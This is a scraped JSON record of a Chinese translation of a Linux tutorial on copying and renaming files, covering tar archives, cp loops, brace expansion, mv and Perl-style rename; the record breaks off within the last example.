{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/77d80105fd15f2465894827e23cc4842.jpeg"], "title": "在 Linux 上复制和重命名文件", "create_date": "2018/06/23 ·", "praise_num": 1, "fav_num": 1, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.networkworld.com/article/3276349/linux/copying-and-renaming-files-on-linux.html\">Sandra Henry-stocker</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9772-1.html\">Linux中国/geekpi</a>   </div><blockquote><p>cp 和 mv 之外，在 Linux 上有更多的复制和重命名文件的命令。试试这些命令或许会惊艳到你，并能节省一些时间。</p></blockquote>\n<p>Linux 用户数十年来一直在使用简单的 <code>cp</code> 和 <code>mv</code> 命令来复制和重命名文件。这些命令是我们大多数人首先学到的，每天可能有数百万人在使用它们。但是还有其他技术、方便的方法和另外的命令，这些提供了一些独特的选项。</p>\n<p>首先，我们来思考为什么你想要复制一个文件。你可能需要在另一个位置使用同一个文件，或者因为你要编辑该文件而需要一个副本，并且希望确保备有便利的备份以防万一需要恢复原始文件。这样做的显而易见的方式是使用像 <code>cp myfile myfile-orig</code> 这样的命令。</p>\n<p>但是，如果你想复制大量的文件，那么这个策略可能就会变得很老。更好的选择是：</p>\n<ul>\n<li>在开始编辑之前，使用 <code>tar</code> 创建所有要备份的文件的存档。</li>\n<li>使用 <code>for</code> 循环来使备份副本更容易。</li>\n</ul>\n<p>使用 <code>tar</code> 的方式很简单。对于当前目录中的所有文件，你可以使用如下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a753ac1560299984728\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tar cf myfiles.tar *\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac1560299984728-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac1560299984728-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a753ac1560299984728-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tar </span><span class=\"crayon-e\">cf </span><span class=\"crayon-v\">myfiles</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e \">tar *</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac1560299984728-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>对于一组可以用模式标识的文件，可以使用如下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a753ac1569064892800\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tar cf myfiles.tar *.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac1569064892800-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac1569064892800-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a753ac1569064892800-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tar </span><span class=\"crayon-e\">cf </span><span class=\"crayon-v\">myfiles</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e \">tar *</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac1569064892800-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>在每种情况下，最终都会生成一个 <code>myfiles.tar</code> 文件，其中包含目录中的所有文件或扩展名为 .txt 的所有文件。</p>\n<p>一个简单的循环将允许你使用修改后的名称来制作备份副本：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a753ac156e850650415\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ for file in *\r\n&gt; do\r\n&gt; cp $file $file-orig\r\n&gt; done\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac156e850650415-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac156e850650415-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac156e850650415-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac156e850650415-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac156e850650415-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a753ac156e850650415-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">file </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac156e850650415-2\"><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">do</span></div><div class=\"crayon-line\" id=\"crayon-5b4a753ac156e850650415-3\"><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">cp</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">file</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">file</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">orig</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac156e850650415-4\"><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">done</span></div><div class=\"crayon-line\" id=\"crayon-5b4a753ac156e850650415-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>当你备份单个文件并且该文件恰好有一个长名称时，可以依靠使用 <code>tab</code> 来补全文件名（在输入足够的字母以便唯一标识该文件后点击 <code>Tab</code> 键）并使用像这样的语法将 <code>-orig</code> 附加到副本的名字后。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a753ac1571417830974\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cp file-with-a-very-long-name{,-orig}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac1571417830974-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac1571417830974-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a753ac1571417830974-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cp</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">file</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">with</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">a</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">very</span><span class=\"crayon-o\">-</span><span class=\"crayon-t\">long</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">name</span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac1571417830974-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>然后你有一个 <code>file-with-a-very-long-name</code> 和一个 <code>file-with-a-very-long-name-orig</code>。</p>\n<h3 id=\"toc_1\">在 Linux 上重命名文件</h3>\n<p>重命名文件的传统方法是使用 <code>mv</code> 命令。该命令将文件移动到不同的目录，或原地更改其名称，或者同时执行这两个操作。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a753ac1575565556410\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ mv myfile /tmp\r\n$ mv myfile notmyfile\r\n$ mv myfile /tmp/notmyfile\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac1575565556410-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac1575565556410-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac1575565556410-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac1575565556410-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a753ac1575565556410-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mv </span><span class=\"crayon-v\">myfile</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">tmp</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac1575565556410-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mv </span><span class=\"crayon-e\">myfile </span><span class=\"crayon-i\">notmyfile</span></div><div class=\"crayon-line\" id=\"crayon-5b4a753ac1575565556410-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mv </span><span class=\"crayon-v\">myfile</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tmp</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">notmyfile</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac1575565556410-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>但我们也有 <code>rename</code> 命令来做重命名。使用 <code>rename</code> 命令的窍门是习惯它的语法，但是如果你了解一些 Perl，你可能发现它并不棘手。</p>\n<p>有个非常有用的例子。假设你想重新命名一个目录中的文件，将所有的大写字母替换为小写字母。一般来说，你在 Unix 或 Linux 系统上找不到大量大写字母的文件，但你可以有。这里有一个简单的方法来重命名它们，而不必为它们中的每一个使用 <code>mv</code> 命令。 <code>/A-Z/a-z/</code> 告诉 <code>rename</code> 命令将范围 <code>A-Z</code> 中的任何字母更改为 <code>a-z</code> 中的相应字母。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a753ac1578916360521\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ls\r\nAgenda Group.JPG MyFile\r\n$ rename 'y/A-Z/a-z/' *\r\n$ ls\r\nagenda group.jpg myfile\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac1578916360521-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac1578916360521-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac1578916360521-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac1578916360521-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac1578916360521-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac1578916360521-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a753ac1578916360521-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac1578916360521-2\"><span class=\"crayon-e\">Agenda </span><span class=\"crayon-v\">Group</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">JPG </span><span class=\"crayon-i\">MyFile</span></div><div class=\"crayon-line\" id=\"crayon-5b4a753ac1578916360521-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">rename</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'y/A-Z/a-z/'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac1578916360521-4\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span></div><div class=\"crayon-line\" id=\"crayon-5b4a753ac1578916360521-5\"><span class=\"crayon-e\">agenda </span><span class=\"crayon-v\">group</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">jpg </span><span class=\"crayon-i\">myfile</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac1578916360521-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>你也可以使用 <code>rename</code> 来删除文件扩展名。也许你厌倦了看到带有 .txt 扩展名的文本文件。简单删除这些扩展名 —— 用一个命令。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a753ac157c667605066\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ls\r\nagenda.txt notes.txt weekly.txt\r\n$ rename 's/.txt//' *\r\n$ ls\r\nagenda notes weekly\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac157c667605066-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac157c667605066-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac157c667605066-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac157c667605066-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a753ac157c667605066-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a753ac157c667605066-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a753ac157c667605066-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a753ac157c667605066-2\"><span class=\"crayon-v\">agenda</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-v\">notes</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-v\">weekly</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4a753ac157c667605066-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">rename</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'s/.txt//'</span><span 